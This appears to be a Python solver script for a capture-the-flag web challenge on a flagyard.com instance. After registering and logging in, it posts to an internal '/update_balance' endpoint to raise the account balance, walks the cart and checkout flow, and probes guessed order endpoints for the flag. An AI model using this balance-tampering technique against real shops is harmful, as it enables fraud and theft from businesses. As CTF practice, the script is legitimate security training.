#!/usr/bin/env python3
"""
Complete the purchase process to trigger flag revelation - Task 4
"""

from ctf_solver import CTFSolver
import re

def complete_purchase():
    """Complete the purchase process following the exact checkout flow"""
    print("=" * 60)
    print("COMPLETING PURCHASE PROCESS - TASK 4")
    print("=" * 60)
    
    base_url = "http://u2lsx1lvvxnfzg-0.playat.flagyard.com"
    solver = CTFSolver(base_url)
    
    # Step 1: Complete authentication flow
    print("[+] Step 1: Register and login")
    solver.register(username='testuser', password='testpass')
    solver.login(username='testuser', password='testpass')
    
    # Step 2: Update balance to afford purchases
    print("\n[+] Step 2: Update balance using internal endpoint")
    balance_response = solver.make_request(f"{base_url}/update_balance/2", {'balance': '10000'}, 'POST')
    if balance_response and balance_response['status'] == 200:
        print("[+] Balance updated successfully!")
        
        # Check for flag in balance update response
        flag = solver.find_flag(balance_response['content'])
        if flag:
            print(f"[!] FLAG FOUND AFTER BALANCE UPDATE: {flag}")
            return flag
    else:
        print("[-] Balance update failed")
    
    # Step 3: Add item to cart
    print("\n[+] Step 3: Add item to cart")
    cart_response = solver.make_request(f"{base_url}/add_to_cart/3")  # Headphones
    if cart_response and cart_response['status'] == 200:
        print("[+] Item added to cart successfully!")
        
        # Check for flag in add to cart response
        flag = solver.find_flag(cart_response['content'])
        if flag:
            print(f"[!] FLAG FOUND AFTER ADDING TO CART: {flag}")
            return flag
    else:
        print("[-] Failed to add item to cart")
        return None
    
    # Step 4: Access cart page
    print("\n[+] Step 4: Access cart page")
    cart_page_response = solver.make_request(f"{base_url}/cart")
    if cart_page_response and cart_page_response['status'] == 200:
        print("[+] Cart page accessed successfully!")
        
        # Check for flag in cart page
        flag = solver.find_flag(cart_page_response['content'])
        if flag:
            print(f"[!] FLAG FOUND IN CART PAGE: {flag}")
            return flag
    else:
        print("[-] Failed to access cart page")
        return None
    
    # Step 5: Follow the checkout button link
    print("\n[+] Step 5: Following checkout button link")
    checkout_response = solver.make_request(f"{base_url}/checkout")
    
    if checkout_response and checkout_response['status'] == 200:
        print("[+] Checkout page accessed successfully!")
        print(f"[+] Checkout response URL: {checkout_response['url']}")
        print(f"[+] Checkout content length: {len(checkout_response['content'])}")
        
        # Check for flag in checkout response
        flag = solver.find_flag(checkout_response['content'])
        if flag:
            print(f"[!] FLAG FOUND IN CHECKOUT PAGE: {flag}")
            return flag
        
        # Save checkout content for analysis
        with open('checkout_content.html', 'w') as f:
            f.write(checkout_response['content'])
        print("[+] Checkout HTML saved to 'checkout_content.html'")
        
        # Look for forms in checkout page
        checkout_forms = solver.parse_forms(checkout_response['content'])
        print(f"[+] Found {len(checkout_forms)} forms in checkout page:")
        
        for i, form in enumerate(checkout_forms):
            print(f"    Form {i+1}: {form['method']} {form['action']}")
            for inp in form['inputs']:
                print(f"        Input: {inp}")
        
        # Submit any forms found in checkout
        for i, form in enumerate(checkout_forms):
            print(f"\n[+] Submitting checkout form {i+1}: {form['action']}")
            
            # Build form data
            form_data = {}
            for inp in form['inputs']:
                if inp['type'] == 'hidden':
                    form_data[inp['name']] = inp['value']
                elif inp['type'] in ['text', 'email', 'tel']:
                    # Use dummy data for required fields
                    if 'email' in inp['name'].lower():
                        form_data[inp['name']] = 'test@example.com'
                    elif 'phone' in inp['name'].lower():
                        form_data[inp['name']] = '1234567890'
                    elif 'address' in inp['name'].lower():
                        form_data[inp['name']] = '123 Test St'
                    elif 'name' in inp['name'].lower():
                        form_data[inp['name']] = 'Test User'
                    else:
                        form_data[inp['name']] = inp.get('value', 'test')
                elif inp['type'] == 'submit' and inp['name']:
                    form_data[inp['name']] = inp['value']
            
            # Determine action URL
            action = form['action']
            if action.startswith('/'):
                form_url = f"{base_url}{action}"
            elif action.startswith('http'):
                form_url = action
            else:
                form_url = f"{base_url}/checkout/{action}" if action else f"{base_url}/checkout"
            
            print(f"[+] Submitting to: {form_url}")
            print(f"[+] Form data: {form_data}")
            
            form_response = solver.make_request(form_url, form_data, form['method'])
            if form_response and form_response['status'] == 200:
                print(f"[+] Checkout form submission successful!")
                print(f"[+] Response URL: {form_response['url']}")
                
                # Check for flag in form response
                flag = solver.find_flag(form_response['content'])
                if flag:
                    print(f"[!] FLAG FOUND AFTER CHECKOUT FORM SUBMISSION: {flag}")
                    return flag
                
                # Check response headers for flag
                headers_text = str(form_response.get('headers', ''))
                flag = solver.find_flag(headers_text)
                if flag:
                    print(f"[!] FLAG FOUND IN RESPONSE HEADERS: {flag}")
                    return flag
                
                print(f"[+] Response preview: {form_response['content'][:500]}...")
            else:
                print(f"[-] Checkout form submission failed: {form_response.get('status', 'Unknown')}")
    
    elif checkout_response and checkout_response['status'] in [301, 302, 303, 307, 308]:
        print(f"[+] Checkout redirected to: {checkout_response['url']}")
        
        # Check for flag in redirect response
        flag = solver.find_flag(checkout_response['content'])
        if flag:
            print(f"[!] FLAG FOUND IN CHECKOUT REDIRECT: {flag}")
            return flag
    else:
        print(f"[-] Checkout failed: {checkout_response.get('status', 'Unknown')} - {checkout_response.get('error', 'Unknown error')}")
    
    # Step 6: Try alternative purchase completion endpoints
    print("\n[+] Step 6: Trying alternative purchase completion endpoints")
    completion_endpoints = [
        '/complete_order',
        '/finalize_purchase', 
        '/process_payment',
        '/confirm_order',
        '/place_order'
    ]
    
    for endpoint in completion_endpoints:
        print(f"\n[+] Trying completion endpoint: {endpoint}")
        
        # Try POST with cart data
        completion_data = {
            'product_id': '3',
            'quantity': '1',
            'total': '199.99'
        }
        
        completion_response = solver.make_request(f"{base_url}{endpoint}", completion_data, 'POST')
        if completion_response and completion_response['status'] == 200:
            print(f"[+] {endpoint} successful!")
            
            # Check for flag
            flag = solver.find_flag(completion_response['content'])
            if flag:
                print(f"[!] FLAG FOUND AT {endpoint}: {flag}")
                return flag
    
    print("\n[-] No flag found through purchase completion process")
    return None

if __name__ == "__main__":
    result = complete_purchase()
    if result:
        print(f"\n[!] SUCCESS: Flag found: {result}")
    else:
        print("\n[-] Purchase process completed but no flag found. Need to investigate further.")
